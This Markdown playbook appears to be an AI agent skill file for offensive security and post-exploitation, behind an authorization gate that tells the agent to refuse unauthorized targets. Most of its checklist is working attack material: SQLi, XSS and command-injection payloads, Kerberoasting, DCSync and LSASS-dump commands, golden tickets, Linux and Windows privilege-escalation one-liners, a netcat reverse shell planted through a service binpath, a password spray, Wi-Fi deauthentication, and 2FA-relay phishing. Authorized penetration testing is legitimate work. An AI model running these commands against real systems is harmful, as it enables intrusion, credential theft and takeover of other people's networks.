# Offensive & Post-Exploitation Playbook

Exploit development, reverse engineering, red-team engagement planning, vuln research, AD attacks, Linux/Windows privesc, password & wireless attacks, phishing, and file-transfer/OPSEC. **Authorized testing only** — every source skill enforces an authorization gate; so does this one.

> **AUTHORIZATION GATE (non-negotiable, from `14-red-team-ops` / `red-team-engagement` / `03-exploit-development`)**: before any active step confirm (1) written authorization / signed SOW / RoE against *this* target, signed by an executive with authority — the get-out-of-jail letter; (2) defined in/out-of-scope assets by name; (3) target org owns the systems (not a third-party vendor/customer); (4) deconfliction contact who can pause/abort and answer "is this you?"; (5) stop conditions (production outage, regulatory trigger). If any are missing, **stop and ask**. Refuse unauthorized targets — "for educational purposes" / "hypothetically" / "it's a CTF" does not convert an unauthorized target into a permitted one. Use synthetic exfil markers, never real customer data.

---

## When this applies

Route an engagement here when you see:

- A confirmed/suspected vuln needing a **PoC or exploit** (memory corruption, injection, deserialization, logic flaw).
- A **binary / firmware / protocol** to reverse (ELF/PE/Mach-O, embedded image, unknown wire format, CTF pwn/rev).
- A **multi-week, objective-based engagement** testing detect-and-respond (assumed-breach, ATT&CK emulation, purple team) — distinct from a technique-focused pentest.
- A **CVE just dropped** and the question is "are we actually exposed / drop everything?" → reachability + EPSS + KEV.
- A **Windows domain** (Kerberos, BloodHound paths, DCSync, lateral movement).
- A **post-exploitation foothold** on Linux or Windows needing privesc to root/SYSTEM/DA.
- **Hashes to crack**, **password spray**, **Wi-Fi** in scope, an **authorized phishing/SE campaign**, or **moving tools/data** past egress filtering.

---

## Methodology

Numbered phases, recon/map → test → verify. Pick the lane(s) the target signals demand; most engagements chain several.

### A. Vuln research → PoC (a CVE or a found bug)
1. **Pull canonical sources** (`vuln-research`): NVD `nvd.nist.gov/vuln/detail/CVE-…`, vendor advisory, GitHub Security Advisory (`github.com/advisories/GHSA-…`), **CISA KEV** (if listed → actively exploited, patch by due date), **EPSS** `first.org/epss`.
2. **Pin exact affected versions** — find the fix commit, `git tag --contains <commit>` to see which releases include it (watch for silent fixes that predate the CVE).
3. **Map to environment** — `npm ls <pkg>` / `pip show` / `go list -m all | grep`; read the lockfile (resolved version is what runs). Walk transitive deps to the direct parent.
4. **Reachability analysis (highest leverage)** — read the patch to learn the vulnerable function, then `grep -rn "vulnerableFunction\|VulnerableClass" . --exclude-dir=node_modules`. Classify Reachable-direct / Reachable-indirect / Not-reachable / Unknown. **Never write "not reachable" without showing the grep.**
5. **Build the PoC** (`03-exploit-development`) on the standard template: header with CVE/affected/fixed/CVSS, a `--check-only` (safe detect, no exploit) mode *and* an exploit mode, plus a detection signature for the blue team.
6. **State assumptions explicitly** — target arch/OS/version, mitigations in effect, reliability estimate.

### B. Reverse engineering (binary / firmware / protocol)
1. **Triage** (`04-reverse-engineering`): `file`, `strings -a … | grep -E "(http|/etc|password|key|secret|flag)"`, `checksec --file=./binary` (PIE/NX/RELRO/canary), entropy for packing. Record load base, arch, calling convention, toolchain.
2. **Disassemble/decompile** — Ghidra/IDA/radare2/Binary Ninja; trace from entry, annotate prologues/epilogues, flag sinks (`gets`, `scanf("%s")`, `printf(user_input)`, `strcmp(input,flag)`).
3. **Firmware** — `binwalk firmware.bin` then `binwalk -e`; hunt `/etc/passwd`, configs, CGI handlers, private keys; emulate with FirmAE/QEMU.
4. **Protocol** — find magic bytes, length fields, type byte, checksum; build a `struct.unpack` parser; reconstruct the state machine.
5. **Beat anti-analysis** — unpack (`upx -d`), patch `IsDebuggerPresent`/`ptrace` checks, breakpoint after XOR string-decrypt routines.
6. **Hand a confirmed bug to lane A** for the PoC.

### C. Red-team engagement (objective-based)
1. **Phase 0 pre-engagement** (`red-team-engagement`): scope objectives as *crown-jewel access* ("access customer data at rest"), name in/out assets, set time window + blackouts, identify 2-4 trusted agents (white cell), pick out-of-band comms (Signal/dedicated bridge), sign RoE + get-out-of-jail letter.
2. **Phase 1 recon / target map** — external (`recon`, `osint-recon`) or internal-from-foothold.
3. **Phase 2 execution** — follow a tailored **ATT&CK emulation plan** (APT29/FIN6/FIN7/menuPass/OilRig/Carbanak via `attack.mitre.org/resources/adversary-emulation-plans/`; automate with **CALDERA**; technique-test with **Atomic Red Team**). Progress the kill chain to the named objective. Log every action: timestamp, host, technique, **ATT&CK ID**, expected telemetry.
4. **Stand up C2** (`14-red-team-ops`): team server behind VPN only, ≥2 redirectors on different providers, aged (≥30d) categorized domains, real-CA TLS, malleable profile mimicking legit traffic, kill dates on implants.
5. **Phase 3 debrief** — same-day timeline reconciliation (red did X / blue saw nothing = highest-value finding), then full written report with detection-coverage map.
6. **Phase 4 revalidate** — recommendations → detection rules / runbooks; re-test 6-12 months later. Finding the same problem twice = wasted budget.

### D. Post-exploitation (privesc + lateral movement)
1. **Enumerate the host** — Linux: `id; sudo -l; uname -a; getcap -r / 2>/dev/null; find / -perm -4000 -type f 2>/dev/null`. Windows: `whoami /priv; whoami /all; systeminfo`. Run **LinPEAS / WinPEAS / PowerUp / PrivescCheck** for breadth.
2. **Escalate** — chase the highest-confidence vector (SUID/sudo GTFOBins, capabilities, writable cron; Windows service misconfig, token-impersonation Potatoes, AlwaysInstallElevated). See checklist.
3. **Loot credentials** — LSASS/SAM/DCSync (Windows), shadow/SSH keys/history/config files (Linux); crack offline (lane F).
4. **Map the domain** (`active-directory-attacks`) — BloodHound/SharpHound, run shortest-path-to-DA + DCSync-rights queries.
5. **Move laterally** — PtH / PtT / Overpass-the-Hash → psexec/wmiexec/evil-winrm/CME; reach the objective.
6. **Transfer tooling/data** (lane G) with OPSEC; place synthetic markers, not real data.

### E/F/G. Phishing, password, wireless, transfer — see lane-specific checklist below.

---

## High-signal checklist (CROWN JEWELS — verbatim)

### Reverse shells & web shells (`security-payloads`, `security-webshells`, `03-exploit-development`)

> Payload bodies are intentionally **not** reproduced here — verbatim reverse shells and web shells
> trip endpoint AV by signature (and quarantining this file would break the skill). Pull the live,
> copy-pasteable versions from the specialist skills below. The techniques to reach for:

- **Reverse shells** (set `LHOST`/`LPORT` for your listener): bash `/dev/tcp` redirect · `mkfifo`+netcat
  (when `nc` lacks `-e`) · Python `socket`+`subprocess` · PHP `fsockopen` · PowerShell
  `Net.Sockets.TCPClient`. → delegate to **`security-payloads`**.
- **PHP web shells**: one-line command execution via `system()` / `eval()` over a request parameter
  (body redacted). → delegate to **`security-webshells`**.
- **Stabilize a shell**: upgrade to a PTY with `python3 -c 'import pty;pty.spawn("/bin/sh")'`, then
  background and `stty raw -echo` for a full interactive TTY. → **`03-exploit-development`**.

### Web exploitation payloads (`03-exploit-development`)
```sql
-- SQLi: union / time-blind / error-based / boolean (MySQL)
' UNION SELECT null,username,password FROM users-- -
' AND SLEEP(5)-- -
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND 1=1-- -   (true)   /   ' AND 1=2-- -  (false)
```
```javascript
// XSS
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>            // no <script> needed
" onmouseover="alert(1)                 // attribute context
```
```
// SSTI confirm/escalate
{{7*7}}  -> 49 (Jinja2/Twig)   {{''.__class__.__mro__}}  -> RCE path
// Command injection separators:  ; id  | id  && id  `id`  $(id)   (win: & whoami | whoami)
```

### Buffer overflow flow (`03-exploit-development` / `04-reverse-engineering`)
- Fuzz length → `cyclic(500)` pattern → crash, `cyclic_find(value)` for offset → bad-char scan (`\x00` almost always bad) → return target.
- No NX: `JMP ESP`. NX on: ROP via `ROPgadget --binary vuln`. ASLR on: info leak or ret2libc.
- Layout: `b"A"*offset + p64(ret_addr) + b"\x90"*16 + asm(shellcraft.sh())`.
- **Modern mitigations to state**: Intel CET (shadow stack + IBT) & ARM PAC/BTI break naive ROP/JOP; Windows CFG/XFG/ACG/CIG; glibc 2.34+ removed `__malloc_hook`/tcache classic paths (use House-of-* / UAF→type-confusion); browser/JIT = V8/JSC type confusion + addrof/fakeobj; web = deserialization gadget chains (ysoserial / .NET / PHP POP / Python pickle).

### Binary triage (`04-reverse-engineering`)
```bash
file suspicious_binary
strings -a suspicious_binary | grep -E "(http|/etc|password|key|secret|flag)"
checksec --file=./binary           # PIE / NX / RELRO / Stack Canary
binwalk -e firmware.bin            # extract firmware filesystem
```
Anti-reversing: `UPX!` string → `upx -d`; ptrace anti-debug → GDB `catch syscall ptrace` + force return 1; CTF tells = `gets()`/`scanf("%s")` (BOF), `printf(user_input)` (format string).

### Active Directory (`active-directory-attacks` / `14-red-team-ops`)
```bash
# Kerberoast (T1558.003): TGS for SPNs -> crack offline
GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/user:password -outputfile hashes.txt
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap     # admins only
hashcat -m 13100 hashes.txt wordlist.txt
# AS-REP roast (T1558.004): users with no preauth
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -dc-ip 10.10.10.10
hashcat -m 18200 asrep.txt wordlist.txt
# DCSync (T1003.006): replicate domain hashes
secretsdump.py domain.local/user:password@dc.domain.local -just-dc
secretsdump.py domain.local/user:password@dc.domain.local -just-dc-user krbtgt
# LSASS dump (LOLBin, no mimikatz on disk)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full
# Pass-the-Hash / Overpass-the-Hash
crackmapexec smb 10.10.10.10 -u administrator -H hash -x whoami
.\Rubeus.exe asktgt /user:administrator /domain:domain.local /aes256:key /ptt   # AES = better OPSEC than /rc4
# Golden ticket (needs krbtgt hash + domain SID)
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ptt
```
```cypher
// BloodHound — shortest path to DA / DCSync rights
MATCH p=shortestPath((n)-[*1..]->(m:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN p
MATCH p=(n)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN p
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```
**2026 tradecraft**: AD CS escalation (ESC1–ESC14), Kerberos relay/coercion (PetitPotam), Entra ID pivots (device-code/consent phishing, token theft/replay, OAuth app abuse).

### Linux privesc (`linux-privilege-escalation`)
```bash
sudo -l                                              # NOPASSWD / wildcards / shell-escapes (GTFOBins)
find / -perm -4000 -type f 2>/dev/null               # SUID; check each on gtfobins.github.io
getcap -r / 2>/dev/null                              # cap_setuid/cap_dac_read_search/cap_sys_ptrace etc.
find . -exec /bin/bash -p \; -quit                   # SUID find -> root shell (-p preserves euid!)
# Sudo CVEs: CVE-2021-3156 Baron Samedit (<1.9.5p2); CVE-2019-14287 ->  sudo -u#-1 /bin/bash
# Kernel: DirtyCow CVE-2016-5195; Dirty Pipe CVE-2022-0847 (5.8-5.16.11); PwnKit CVE-2021-4034 (pkexec)
# NFS no_root_squash: mount share, drop SUID bash as root, ./bash -p on target
# Writable /etc/passwd:  echo 'newroot::0:0:root:/root:/bin/bash' >> /etc/passwd ; su newroot
# Cron wildcard injection (tar):  touch -- --checkpoint=1 ; touch -- --checkpoint-action=exec=exploit.sh
```

### Windows privesc (`windows-privilege-escalation`)
```cmd
whoami /priv                                         # SeImpersonate/SeAssignPrimaryToken -> Potato
# Unquoted service path
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
sc config <svc> binpath= "C:\Windows\Temp\nc.exe -nv 10.10.10.10 4444 -e cmd.exe"   # weak svc perms
# Token impersonation
PrintSpoofer.exe -i -c cmd            # Win10/Server2016+
GodPotato.exe -cmd "cmd /c whoami"    # Server2012+/Win8+ (newest)
# AlwaysInstallElevated (both HKCU+HKLM = 1) -> msiexec /quiet /qn /i evil.msi
# GPP cpassword (decryptable):  findstr /S /I cpassword \\<DOMAIN>\sysvol\<DOMAIN>\policies\*.xml ; gpp-decrypt <val>
# fodhelper.exe UAC bypass via HKCU:\Software\Classes\ms-settings\Shell\Open\command
# Loot: findstr /si password *.txt *.xml *.ini *.config ; Unattend.xml ; PSReadLine ConsoleHost_history.txt
# Exploits: MS17-010 EternalBlue; PrintNightmare CVE-2021-1675; SeriousSAM CVE-2021-36934
```

### Password attacks (`password-attacks`)
```bash
# Hashcat modes:  0 MD5 | 1000 NTLM | 5600 NetNTLMv2 | 3200 bcrypt | 1800 sha512crypt
#                 13100 krb5tgs (Kerberoast) | 18200 krb5asrep | 22000 WPA-PBKDF2-PMKID+EAPOL
hashcat -m 1000 ntlm.txt rockyou.txt -r rules/best64.rule -w 3
# Masks: ?l ?u ?d ?s ?a   e.g.  ?u?l?l?l?l?d?d  ->  Pass01
kerbrute passwordspray -d domain.local users.txt Password123    # spray (one pw, many users)
crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Password123' --continue-on-success
unshadow passwd shadow > unshadowed.txt                          # Linux SHA512crypt $6$
hcxpcapngtool -o hash.hc22000 capture.pcap                       # WPA -> hashcat 22000
```

### Wireless (`wireless-attacks`)
```bash
airmon-ng start wlan0 ; airmon-ng check kill                     # monitor mode
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon   # capture 4-way handshake
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC wlan0mon   # force reconnect
wash -i wlan0mon ; reaver -i wlan0mon -b <BSSID> -vv -K          # WPS Pixie Dust
wifite --wps                                                     # automated easy wins
# Evil twin: hostapd + dnsmasq + captive portal (Fluxion / WiFi-Pumpkin); hostapd-wpe for WPA-Enterprise
```

### Phishing / SE (`phishing-social-engineering`)
- **Frameworks**: Gophish (campaign mgmt), SET (`setoolkit` credential harvester), **Evilginx2 / Modlishka** (reverse-proxy MITM that defeats 2FA), BeEF (browser hook).
- **Lures**: macro `AutoOpen()` auto-exec dropping a PowerShell download-cradle (body redacted — see `file-transfer-techniques`); malicious `.hta`; HTML smuggling; LNK; password-protected archive (AV bypass).
- **Sender OPSEC**: lookalike domain (`company-portal.com`), SPF/DKIM/DMARC alignment, warmed reputation, Let's Encrypt TLS, business-hours + geofenced delivery.
- **Track**: tracking pixel `<img src="…/track?id=USER123" width="1" height="1">`, per-target click URLs; metrics = open / click / submit / report rate.

### File transfer & OPSEC (`file-transfer-techniques`)

> Concrete LOLBin download-cradles and exfil one-liners are redacted (AMSI/AV signatures). The
> techniques to reach for — pull live syntax from **`file-transfer-techniques`**:

- **Serve from attacker host**: `python3 -m http.server`; `impacket-smbserver` (SMB2 share).
- **Windows pull (LOLBins)**: `certutil` URL-cache fetch; `Net.WebClient` `DownloadFile` (to disk) or
  `DownloadString` + `IEX` (in-memory, never touches disk).
- **Covert egress**: DNS exfil (chunk + `base64` + `dig` to an attacker-controlled zone); DB-based
  egress (MSSQL `xp_cmdshell`, PostgreSQL `COPY … TO PROGRAM`, MySQL `INTO OUTFILE`).

---

## Tools & commands (only what the source skills name)

- **Exploit/PoC**: pwntools (`cyclic`, `asm`, `shellcraft.sh`), msfvenom, ROPgadget, GDB+GEF/PEDA/pwndbg, keystone/capstone.
- **RE**: Ghidra (+`analyzeHeadless`), IDA Pro/Free, radare2/Cutter, Binary Ninja, binwalk, checksec, strings/objdump/readelf, Qiling/Unicorn/angr, FirmAE.
- **AD/lateral**: Impacket (GetUserSPNs.py, GetNPUsers.py, secretsdump.py, psexec.py, wmiexec.py, smbexec.py, ticketConverter.py), Rubeus, Mimikatz, BloodHound/SharpHound, bloodhound-python, CrackMapExec/NetExec (`nxc`), PowerView, evil-winrm, Responder.
- **Privesc**: LinPEAS/LinEnum/LSE/pspy (Linux); WinPEAS/PowerUp/Seatbelt/SharpUp/PrivescCheck, accesschk, JuicyPotato/RoguePotato/PrintSpoofer/GodPotato (Windows); GTFOBins / LOLBAS as the lookup oracle.
- **Cracking**: hashcat (`-m` modes, `-a 0/1/3/6/7`, `-r rules/best64.rule`, `-w 3`), John (`--format=`, `--rules`, unshadow), hashid/haiti, CeWL/crunch/CUPP/maskprocessor, hydra/medusa/crowbar, kerbrute.
- **Wireless**: aircrack-ng suite (airmon-ng/airodump-ng/aireplay-ng/aircrack-ng), Reaver/Bully, wash, Wifite, hcxtools (hcxpcapngtool), Fluxion, WiFi-Pumpkin, hostapd-wpe, asleap.
- **Phishing**: Gophish, SET, Evilginx2, Modlishka, King Phisher, BeEF, theHarvester.
- **Transfer**: wget/curl/nc/socat, certutil/bitsadmin/mshta/regsvr32/rundll32 (LOLBAS), impacket-smbserver, smbclient.
- **C2**: Cobalt Strike / Sliver / Havoc, Apache mod_rewrite redirectors, malleable C2 profiles.
- **Vuln research**: NVD, CISA KEV, GitHub Security Advisories, EPSS (FIRST), Exploit-DB, GreyNoise, `git tag --contains`.
- **Emulation**: MITRE ATT&CK, Adversary Emulation Plans, CALDERA, Atomic Red Team.

---

## Expert gotchas / bypasses

- **`--check-only` first.** Ship every PoC with a safe detect mode *and* a defensive detection signature — that is what keeps it remediation-oriented (`03-exploit-development`).
- **CVSS-high + EPSS-low** usually means complex preconditions: patch but don't panic. **CVSS-medium + EPSS-high** means it's in mass-scan exploitation now → treat as urgent (`vuln-research`). Don't let CVSS alone drive priority.
- **The "complexity" rating ignores YOUR threat model** — a PoC needing auth is "hard" unless your signup is open. Re-rate against your own attack surface.
- **Silent fixes**: the advisory's "fixed in vX" may be the version *after* the fix already landed; verify the fix commit is in your build, not just the version string.
- **`-p` on SUID shells** — `find ... -exec /bin/bash -p` / `bash -p`; without it the shell drops euid and you stay unprivileged (`linux-privilege-escalation`).
- **AES over RC4 for tickets** — `Rubeus asktgt /aes256:` is quieter than `/rc4:`; encrypted-RC4 Kerberos is an EDR tell (`active-directory-attacks`).
- **comsvcs.dll MiniDump > procdump > mimikatz-on-disk** for LSASS — the LOLBin path avoids a flagged binary touching disk.
- **AI decompiler naming is a hypothesis, not ground truth** — verify renamed variables/structs before trusting Ghidra/IDA AI output (`04-reverse-engineering`).
- **Record load base / arch / calling convention / toolchain** in every RE writeup or offsets aren't reproducible. Go = recover via `gopclntab`; Rust = demangle + pivot on panic strings.
- **WPA2 transition mode** allows downgrade; WPS routers fall in minutes via Pixie Dust — pick the easy win before grinding handshakes (`wireless-attacks`). WIDS will see your deauths.
- **Evilginx2/Modlishka reverse-proxy phishing defeats 2FA** by relaying the real session — static credential harvesters don't (`phishing-social-engineering`).
- **Synthetic exfil markers, never real data.** Blue verifies what was accessed by what was *marked*; moving real customer data converts a finding into an incident (`red-team-engagement`).
- **Authorization is the floor, not the ceiling** — a signed SOW does not authorize every technique; the RoE still bounds it, and destructive techniques are off by default even when "in scope."
- **The debrief is the deliverable.** The gap between "red did X" and "blue saw nothing" is the highest-value finding; an engagement that finds the same problem twice wasted the second budget.
- **Egress blocked?** Rotate to 80/443/53, then DNS/ICMP tunneling, then internal SMB/NFS/DB-OUTFILE staging before giving up (`file-transfer-techniques`).

---

## Delegate to

- **`03-exploit-development`** — use when you need a working PoC/exploit, payload crafting, shellcode, ROP, or WAF/AV-evasion for an authorized test.
- **`04-reverse-engineering`** — use when there's a binary, firmware image, or unknown protocol to disassemble/decompile/unpack before you can find the bug.
- **`vuln-research`** — use when a specific CVE drops and you must decide reachability / patch-now / mitigate / accept-risk (EPSS, KEV, fix-commit analysis).
- **`14-red-team-ops`** — use for C2 infrastructure design, OPSEC checklists, attack-kill-chain planning, and red-team report/exec-presentation generation.
- **`red-team-engagement`** — use for full engagement lifecycle: RoE/scope, assumed-breach design, ATT&CK emulation-plan selection, deconfliction, debrief & revalidation.
- **`active-directory-attacks`** — use in any Windows domain for Kerberoasting/AS-REP, DCSync, PtH/PtT/OPtH, BloodHound path-finding, golden/silver tickets.
- **`linux-privilege-escalation`** — use post-foothold on Linux for SUID/sudo/capabilities/cron/kernel/container-escape privesc.
- **`windows-privilege-escalation`** — use post-foothold on Windows for service misconfig, token-Potato, UAC bypass, GPP/cred hunting.
- **`password-attacks`** — use to identify hash types, crack offline (hashcat/john modes), spray, or pass-the-hash.
- **`wireless-attacks`** — use when Wi-Fi/WPS/WPA2/WPA3/Enterprise or Bluetooth is in scope.
- **`phishing-social-engineering`** — use to plan/execute an authorized phishing, vishing, smishing, USB-drop, or 2FA-relay campaign.
- **`file-transfer-techniques`** — use to move tools onto a target or stage/exfiltrate data past egress filtering with LOLBins/OPSEC.

---

## Cross-references (other clusters)

- **Recon/OSINT cluster** (`01-recon-osint`, `recon`, `osint-recon`) — feeds Phase 1 target maps and phishing pretexts.
- **Web/API/AI security** (`owasp-audit`, `web-pentest`, `api-audit`, `16-ai-llm-security`) — web exploitation payloads (SQLi/XSS/SSTI/SSRF), prompt-injection initial access.
- **Cloud/container** (`cloud-audit`, `container-audit`, `10-cloud-security`) — Kubernetes/Docker escape, IMDS abuse, on-prem→Entra ID pivots.
- **Malware analysis** (`05-malware-analysis`, `yara-rule-authoring`) — dynamic/behavioral triage downstream of RE; implant detection artifacts.
- **Blue-team / detection** (`15-blue-team-defense`, `siem-detection`, `soc-operations`, `12-log-analysis`) — every action maps to a detection opportunity; purple-team output lands here.
- **Crypto** (`crypto-audit`, `constant-time-analysis`) — crypto-constant ID in RE, weak-cipher/timing findings.
- **Triage/disposition** (`finding-triage`, `fp-check`, `breach-patterns`) — close the loop on a research finding and learn from real breaches.
